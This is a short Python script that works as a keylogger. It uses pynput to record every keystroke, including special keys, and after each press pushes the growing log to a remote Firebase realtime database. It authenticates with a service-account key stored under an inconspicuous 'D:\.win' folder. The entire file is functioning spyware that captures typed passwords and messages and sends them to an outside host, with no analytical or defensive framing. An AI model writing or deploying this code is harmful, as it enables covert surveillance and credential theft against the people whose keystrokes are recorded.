from pynput.keyboard import Key, Listener
import firebase_admin
from firebase_admin import credentials, db

cred = credentials.Certificate("D:\.win\kee.json")
firebase_admin.initialize_app(cred, {'databaseURL': 'https://keyl-882a4-default-rtdb.firebaseio.com/'})
the_keys = []

def functionPerKey(key):
    special_keys = {
        Key.shift: "[Shift]",
        Key.alt: "[Alt]",
        Key.ctrl: "[Ctrl]",
        Key.cmd: "[Windows]",
        Key.enter: "\n",
        Key.backspace: "[Backspace]",
        Key.space: " ",
        Key.tab: "\t",
        Key.esc: "[Esc]",
        Key.up: "[Up]",
        Key.down: "[Down]",
        Key.left: "[Left]",
        Key.right: "[Right]",
        Key.home: "[Home]",
        Key.end: "[End]",
        Key.page_up: "[PageUp]",
        Key.page_down: "[PageDown]",
        Key.insert: "[Insert]",
        Key.delete: "[Delete]",
        Key.f1: "[F1]",
        Key.f2: "[F2]",
        Key.f3: "[F3]",
        Key.f4: "[F4]",
        Key.f5: "[F5]",
        Key.f6: "[F6]",
        Key.f7: "[F7]",
        Key.f8: "[F8]",
        Key.f9: "[F9]",
        Key.f10: "[F10]",
        Key.f11: "[F11]",
        Key.f12: "[F12]",
    }

    if hasattr(key, 'char') and key.char is not None:
        the_keys.append(key.char)
    elif key in special_keys:
        the_keys.append(special_keys[key])
    else:
        the_keys.append(f"({key})")

    storeKeysToFirebase(the_keys)

def storeKeysToFirebase(keys):
    ref = db.reference('/log1')
    keys_str = ''.join(map(str, keys))
    ref.push().set(keys_str)

def onEachKeyRelease(key):
    if key == Key.esc:
        the_listener.stop()

with Listener(
        on_press=functionPerKey,
        on_release=onEachKeyRelease
) as the_listener:
    the_listener.join()
